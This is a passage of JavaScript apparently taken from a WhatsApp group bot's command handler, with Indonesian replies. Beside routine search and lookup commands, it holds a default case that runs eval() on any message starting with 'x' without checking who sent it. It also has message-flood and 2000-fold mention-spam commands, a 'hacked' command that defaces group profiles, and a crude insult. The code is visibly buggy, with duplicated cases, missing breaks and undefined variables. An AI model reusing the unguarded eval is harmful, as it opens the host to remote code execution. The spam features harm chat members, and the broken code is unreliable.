if (!isRegister)return reply(mess.only.register)
                 if (!isRegister) return reply(mess.only.regiter)    
				teks = 'This is list of banned number :\n'
				for (let benn of ban) {
					teks += `~> @${benn.split('@')[0]}\n`
					}
					teks += `Total : ${ban.length}`
				hexa.sendMessage(from, teks.trim(), extendedText, {quoted: ftroli, contextInfo: {"mentionedJid": ban}})
				break

                    case 'tutuptime': //by Fernazer
              hexa.updatePresence(from, Presence.recording) 
		if (!isRegister) return reply(mess.only.regiter)
		if (isBanned) return reply(mess.only.banned)
		if (!isGroupAdmins) return repl(mess.only.admin)
   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
              if (args[1]=="detik") {var timer = args[0]+"000"
				} else if (args[1]=="menit") {var timer = args[0]+"0000"
				} else if (args[1]=="jam") {var timer = args[0]+"00000"
				} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
				setTimeout( () => {
					var nomor = mek.participant
					const close = {
					text: `Grup ditutup oleh admin @${nomor.split("@s.whatsapp.net")[0]}\nsekarang *hanya admin* yang dapat mengirim pesan`,
					contextInfo: { mentionedJid: [nomor] }
					}
					hexa.groupSettingChange (from, GroupSettingChange.messageSend, true);
					reply(close)
				}, timer)
				break
case 'timer':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isGroupAdmins)return reply(mess.only.admin)
				if (args[1]=="detik") {var timer = args[0]+"000"
				} else if (args[1]=="menit") {var timer = args[0]+"0000"
				} else if (args[1]=="jam") {var timer = args[0]+"00000"
				} else {return reply("*pilih:*\ndetik\nmenit\njam")}
				setTimeout( () => {
				reply("Waktu habis")
				}, timer)
				break
case 'repeatag':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isGroupAdmins)return reply(mess.only.admin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply("Gada yang di tag")
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
teks = `*Repeat Tag*\n${q}`
teks += "\n\n"
members_id = []
for (let z = 0; z < 2000; z++) {
teks += ` @${mentioned[0].split("@")[0]}`
members_id.push(mentioned[0])
}
mentions(teks, members_id, true)
break
case 'hacked':
  if (!isGroup) return reply(mess.only.group)
 if (!isBotGroupAdmins) return reply(mess.only.adminB)
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isGroupAdmins)return reply(mess.only.admin)
              if (args.length < 1) return reply('Teksnya?')
              reply('Otw Hack')
                tessgc = await getBuffer(`https://i.ibb.co/dpfVP0M/526dcd79288f.jpg`)
                   hexa.updateProfilePicture (from, tessgc)
                   await sleep(1000)
                hexa.groupUpdateSubject(from, `HACKED BY ${body.slice(8)}`)
                await sleep(1000)
                hexa.groupUpdateDescription(from, `_${pushname} telah meretas grup ini_`)             
                await sleep(1000)
                hexa.sendMessage(from, 'Succes Hacked', text, {quoted: ftroli})
break
case 'setppgc':
if (!isGroup) return reply(mess.only.group)
if (!isRegister) return reply(mess.only.register)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
reply(mess.wait)
const mediaaa = await hexa.downloadAndSaveMediaMessage(encmedia)
await hexa.updateProfilePicture (from, media)
reply('*☉* Mengganti foto profil grup')
break
//--notifikasi grup
  case 'notif':

if (!isGroupAdmins) return reply(mess.only.admin)
hexa.updatePresence(from, Presence.recording)
if (!isRegister) return reply(mess.only.register)
if (!isGroup) return reply(mess.only.group)
teks = `Notif dari @${sender.split("@")[0]}\n*Pesan : ${body.slice(7)}*`
group = await hexa.groupMetadata(from);
member = group['participants']
jids = [];
member.map(async adm => {
  jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
})
options = {
  text: teks,
  contextInfo: {
mentionedJid: jids
  },
  quoted: mek
}
await hexa.sendMessage(from, options, text)
break
				case 'listadmins':
				  case 'listadmin':
				    case 'adminlist':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isGroupAdmins)return reply(mess.only.admin)
					if (!isGroup) return reply(mess.only.group)
					teks = `List admin of group *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
case 'listonline':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isGroupAdmins)return reply(mess.only.admin)
        		let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
			    let online = [...Object.keys(hexa.chats.get(ido).presences), hexa.user.jid]
			    hexa.sendMessage(from, 'List Online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join`\n`, text, { quoted: mek,
  			  contextInfo: { mentionedJid: online }
			    })
				break
case 'clone':
					if (!isGroup) return reply(ind.groupo())
					if (!isOwner) return reply(ind.ownerg()) 
					if (args.length < 1) return reply(' *TAG YANG MAU DI CLONE!!!* ')
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('❬ SUCCSESS ❭')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
					let { jid, id, notify } = groupMembers.find(x => x.jid === mentioned)
					try {
						pp = await hexa.getProfilePicture(id)
						buffer = await getBuffer(pp)
						hexa.updateProfilePicture(botNumber, buffer)
						mentions(`Foto profile Berhasil di perbarui menggunakan foto profile @${id.split('@')[0]}`, [jid], true)
					} catch (e) {
						reply(ind.stikga())
					}
					await limitAdd(sender)
					break
case 'addpremium':
				if (!isOwner) return reply(mess.only.owner)
				prem.push(`${premm}@s.whatsapp.net`)
				fs.writeFileSync('./datauser/premium.json', JSON.stringify(prem))
				reply(`Why Jdi premium dong kek kontol lu canda om :v wa.me/${q} `)
case 'wiki':
if (args.length < 1) return reply(' Yang Mau Di Cari Apa? ')
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return reply('_[ ! ] Error Hasil Tidak Ditemukan_') 
}) 
result = `*Judul :* ${res[0].judul}
*Wiki :* ${res[0].wiki}`
sendFileFromUrl(res[0].thumb, image, {quoted: ftroli, caption: result}).catch(e => {
  reply(result)
})
break
case 'lirik':
 case 'lirik3':
if (args.length < 1) return reply('Judulnya?')
reply(mess.wait)
teks = body.slice(7)
lirikLagu(teks).then((res) => {
let lirik = `${res[0].result}`
reply(lirik)
})
break
case 'google':
if (args.length < 1) return reply('Yang mau di cari apaan?')
teks = args.join(' ')
reply(mess.wait)
res = await ggs({'query' : `${teks}`})
kant = ``
for (let i of res) {
kant += `*Judul* : ${i.title}
*Link* : ${i.link}
*Keterangan* : ${i.snippet}`
}
var akhir = kant.trim()
reply(akhir)
break
case 'herolist':
await herolist().then((ress) => {
let listt = `*List hero untuk feature ${prefix}herodetail*\n\n`
for (var i = 0; i < ress.hero.length; i++) {
listt += '-  ' + ress.hero[i] + '\n'
}
reply(listt)
})
break
case 'herodetail':
res = await herodetails(body.slice(12))
her = `*Hero Details ${body.slice(12)}*

*Nama* : ${res.hero_name}
*Role* : ${res.role}
*Quotes* : ${res.entrance_quotes}
*Fitur Hero* : ${res.hero_feature}
*Spesial* : ${res.speciality}
*Rekomendasi Lane* : ${res.laning_recommendation}
*Harga* : ${res.price.battle_point} [Battle point] | ${res.price.diamond} [DM] | ${res.price.hero_fragment} [Fragment]
*Rilis* : ${res.release_date}

*Durability* : ${res.skill.durability}
*Offence* : ${res.skill.offense}
*Skill Effect* : ${res.skill_effects}
*Difficulty* : ${res.skill.difficulty}
 
*Movement Speed* : ${res.attributes.movement_speed}
*Physical Attack* : ${res.attributes.physical_attack}
*Magic Defense* : ${res.attributes.magic_defense}
*Ability Crit Rate* : ${res.attributes.ability_crit_rate}
*HP* : ${res.attributes.hp}
*Mana* : ${res.attributes.mana}
*Mana Regen* : ${res.attributes.mana_regen}

*Story* : ${res.background_story}`
reply(her)
break
case 'covid':
cvd = await dl.covid()
res = ` *COVID-INDONESIA*

*Kasus:* ${cvd.kasus}
*Sembuh:* ${cvd.sembuh}
*Kematian:* ${cvd.kematian}`
reply(res)
case 'ghstalk':
gh = await dl.ghstalk(q)
ghres = `*GITHUB-STALK*

*• Username:* ${gh.login}
*• Nama:* ${gh.name}
*• Lokasi:* ${gh.location}
*• Email:* ${gh.email}
*• Blog:* ${gh.blog}
*• Bio:* ${gh.bui}
*• Followers:* ${gh.followers}
*• Following:* ${gh.following}
*• Repositories:* ${gh.public_repos}`
sendFile(from, gh.avatar_url, 'anu.png', ghres, m)
case 'getnamagc': case 'getgcnama':
anu = from
metadete = await hexa.groupMetadata(anu)
reply(`${metadete.subject}`)
break
case 'pinterest':
case 'pin':
 case 'pinterestimg':
res = await googleImage(q + "Pinterest", google)
function google(result){
gugim = result
pilter = gugim.filter(hamsil => hamsil.url.includes('pinimg')) 
streng = JSON.parse(JSON.stringify(pilter))
random = streng[Math.floor(Math.random() * streng.length)].url
sendFile(from, random.image, 'anu.png', `Hasil Pencarian Dari:* ${q}`, m)
}
break
case 'googleimage': case 'gimg': case 'image':
res = await googleImage(q, google)
function google(error, result){
gugim = result
pilter = gugim.filter(hamsil => hamsil.url.includes('pinimg')) 
streng = JSON.parse(JSON.stringify(pilter))
random = streng[Math.floor(Math.random() * streng.length)].url
sendFile(from, random.image, 'anu.png', `Hasil Pencarian Dari:* ${q}`, m)
}
break
case 'spam':
                    if (!mek.key.fromMe) return reply(mess)
					if (!arg) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				argsi = arg.split("|")
				if (!argsi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argsi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argsi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argsi[1]; i++){
					hexa.sendMessage(from, argsi[0], MessageType.text)
				}
				break
case 'tospam':
if (!mek.key.fromMe) return reply(mess)
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  hexa.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = arifirazzaq2001.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  hexa.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(arifirazzaq2001).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await hexa.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  hexa.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(arifirazzaq2001).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await hexa.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  hexa.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 1, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(arifirazzaq2001).replace('quotedM','m')).message.extendedTextMessage.contextInfo : arifirazzaq2001
	delb = await hexa.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  hexa.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
case 'addrespon':
			if (!mek.key.fromMe) return reply(mess)
				if (args.length < 1) return reply(`Penggunaan ${prefix}addrespon hai|hai juga`)
				argz = arg.split('|')
				if (checkCommands(argz[0], commandsDB) === true) return reply(`Udah ada`)
				addCommands(argz[0], argz[1], sender, commandsDB)
				reply(`Sukses menambahkan respon ${argz[0]}`)
				break
			case 'delrespon':
			if (!mek.key.fromMe) return reply(mess)
				if (args.length < 1) return reply(`Penggunaan ${prefix}delrespon hai`)
				if (!checkCommands(body.slice(11), commandsDB)) return reply(`Ga ada di database`)
                deleteCommands(body.slice(11), commandsDB)
				reply(`Sukses menghapus respon ${body.slice(11)}`)
				break
case "prefix":
        if (!args.length) return reply(`Opsi prefix\n\n- noprefix\n- multi\n\nExample : ${prefix}prefix noprefix`)
        if (args[0] === "multi") {
          multipref = true;
          reply("berhasil mengubah ke multi prefix")
        } else if (args[0] === "noprefix") {
          multipref = false;
          noprefix = true;
          reply("berhasil mengubah ke no prefix")
        } else {
          reply("pilih multi atau norefix")
        }
        break
case 'setbio':
				if ( !mek.key.fromMe) return reply(mess.only.ownerB)
				if (args.length < 1) return reply('Teksnya?')
					iyek = body.slice(8)
					hexa.setStatus(`${iyek}`)
					reply(`Sukses mengganti bio ke ${body.slice(8)}`)
					break
					case 'setname':
					if ( !mek.key.fromMe) return reply(mess.only.ownerB)
				if (args.length < 1) return reply('Teksnya?')
                anu = body.slice(9)
                hexa.updateProfileName(anu)
                reply(`Sukses mengganti nama ke ${body.slice(9)}`)
                break
case 'leave':
				if (!isGroup) return reply(mess.only.group)
				if ( !mek.key.fromMe) return reply(mess.only.ownerB)
				hexa.updatePresence(from, Presence.composing)
				hexa.groupLeave(from)
						break
					case 'setname':
					if ( !mek.key.fromMe) return reply(mess.only.ownerB)
		 		if (args.length < 1) return reply('Teksnya?')
                anu = body.slice(9)
                hexa.updateProfileName(anu)
                reply(`Sukses mengganti nama ke ${body.slice(9)}`)
                break
case 'herolist':
await herolist().then((ress) => {
let listt = `*List hero untuk feature ${prefix}herodetail*\n\n`
for (var i = 0; i < ress.hero.length; i++) {
listt += '-  ' + ress.hero[i] + '\n'
}
reply(listt)
})
break
case 'herodetail':
res = await herodetails(body.slice(12))
her = `*Hero Details ${body.slice(12)}*

*Nama* : ${res.hero_name}
*Role* : ${res.role}
*Quotes* : ${res.entrance_quotes}
*Fitur Hero* : ${res.hero_feature}
*Spesial* : ${res.speciality}
*Rekomendasi Lane* : ${res.laning_recommendation}
*Harga* : ${res.price.battle_point} [Battle point] | ${res.price.diamond} [DM] | ${res.price.hero_fragment} [Fragment]
*Rilis* : ${res.release_date}

*Durability* : ${res.skill.durability}
*Offence* : ${res.skill.offense}
*Skill Effect* : ${res.skill_effects}
*Difficulty* : ${res.skill.difficulty}
 
*Movement Speed* : ${res.attributes.movement_speed}
*Physical Attack* : ${res.attributes.physical_attack}
*Magic Defense* : ${res.attributes.magic_defense}
*Ability Crit Rate* : ${res.attributes.ability_crit_rate}
*HP* : ${res.attributes.hp}
*Mana* : ${res.attributes.mana}
*Mana Regen* : ${res.attributes.mana_regen}

*Story* : ${res.background_story}`
reply(her)
break
				case 'google':
case 'googlesearch':
case 'ggs':
if (args.length < 1) return reply('Yang mau di cari apaan?')
teks = args.join(' ')
reply(mess.wait)
res = await ggs({'query' : `${teks}`})
kant = ``
for (let i of res) {
kant += `*Judul* : ${i.title}
*Link* : ${i.link}
*Keterangan* : ${i.snippet}`
}
var akhir = kant.trim()
reply(akhir)
break
case 'wiki':
if (args.length < 1) return reply(' Yang Mau Di Cari Apa? ')
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return reply('_[ ! ] Error Hasil Tidak Ditemukan_') 
}) 
result = `*Judul :* ${res[0].judul}
*Wiki :* ${res[0].wiki}`
sendMediaURL(res[0].thumb, image, {quoted: mek, caption: result}).catch(e => {
  reply(result)
})
break
case 'mediafire':
if (args.length < 1) return reply('Link Nya Mana? ')
if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.api)
if (Number(filesize) >= 30000) return reply(`*Nama :* ${res[0].nama}
*Ukuran :* ${res[0].size}
*Link :* ${res[0].link}

_Maaf size melebihi batas maksimal, Silahkan klik link diatas_`)
reply(mess.wait)
teks = args.join(' ')
res = await mediafireDl(teks)
result = `*Nama :* ${res[0].nama}
*Ukuran :* ${res[0].size}

_File sedang dikirim, Silahkan tunggu beberapa menit_`
reply(result)
sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: mek})
break
case 'lirik3':
if (args.length < 1) return reply('Judulnya?')
reply(mess.wait)
teks = body.slice(7)
lirikLagu(teks).then((res) => {
let lirik = `${res[0].result}`
reply(lirik)
})
break
 //---end---\\





default:
if (budy.startsWith('x')){
try {
return hexa.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: ftoko})
} catch(err) {
e = String(err)
reply(e)
}
}  
}
	
		
		   
if (isGroup && budy != undefined) {
	} else {
	console.log(color('[TEXT]', 'red'), 'SELF-MODE', color(sender.split('@')[0]))
	}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'green'))
        }
	// console.log(e)
	}
}


	
    
